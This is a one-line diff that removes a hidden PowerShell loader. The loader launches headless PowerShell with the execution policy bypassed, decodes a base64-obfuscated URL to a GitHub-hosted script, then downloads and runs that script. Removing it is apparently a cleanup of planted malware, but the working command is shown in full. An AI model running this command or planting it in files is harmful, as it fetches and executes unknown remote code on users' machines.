@@ -1,1 +1,1 @@
-conhost.exe --headless powershell -nop -ep bypass -c "iex(irm([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlcmFmaXBrYS9pZGtha2t3YS9yZWZzL2hlYWRzL21haW4vcGlkb3IucHMx'))))"
+
